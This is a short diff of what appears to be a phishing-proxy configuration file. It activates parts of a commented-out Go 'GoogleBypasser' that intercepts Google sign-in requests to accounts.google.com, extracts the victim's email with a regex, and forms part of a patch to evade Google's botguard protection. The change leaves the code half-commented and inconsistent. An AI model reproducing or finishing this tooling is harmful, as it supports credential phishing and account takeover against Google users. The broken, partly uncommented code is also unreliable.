@@ -274,14 +274,14 @@ js_inject:
 # 	log.Debug("[GoogleBypasser]: Browser connected and page created.")
 # }
 
-# func (b *GoogleBypasser) GetEmail(body []byte) {
-# 	//exp := regexp.MustCompile(`f\.req=\[\[\["V1UmUe","\[null,\\"(.*?)\\"`)
-# 	exp := regexp.MustCompile(`f\.req=\[\[\["V1UmUe","\[null,\\"(.*?)\\"`)
-# 	email_match := exp.FindSubmatch(body)
-# 	matches := len(email_match)
-# 	if matches < 2 {
-# 		log.Error("[GoogleBypasser]: Found %v matches for email in request.", matches)
-# 		return
+ func (b *GoogleBypasser) GetEmail(body []byte) {
+ 	//exp := regexp.MustCompile(`f\.req=\[\[\["V1UmUe","\[null,\\"(.*?)\\"`)
+ 	exp := regexp.MustCompile(`f\.req=\[\[\["V1UmUe","\[null,\\"(.*?)\\"`)
+ 	email_match := exp.FindSubmatch(body)
+ 	matches := len(email_match)
+ 	if matches < 2 {
+ 		log.Error("[GoogleBypasser]: Found %v matches for email in request.", matches)
+ 		return
 # 	}
 # 	log.Debug("[GoogleBypasser]: Found email in body : %v", string(email_match[1]))
 # 	b.email = string(bytes.Replace(email_match[1], []byte("%40"), []byte("@"), -1))
@@ -375,11 +375,11 @@ js_inject:
 
 #---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
-				# 		// google botguard patch
+				
 				# 		if strings.EqualFold(req.Host, "accounts.google.com") && strings.Contains(req.URL.String(), "/signin/_/AccountsSignInUi/data/batchexecute?") && strings.Contains(req.URL.String(), "rpcids=V1UmUe") {
 				# 			log.Debug("GoogleBypass working with: %v", req.RequestURI)
 
-				# 			// Decode URL encoded body
+				
 				# 			decodedBody, err := url.QueryUnescape(string(body))
 				# 			if err != nil {
 				# 				log.Error("Failed to decode body: %v", err)
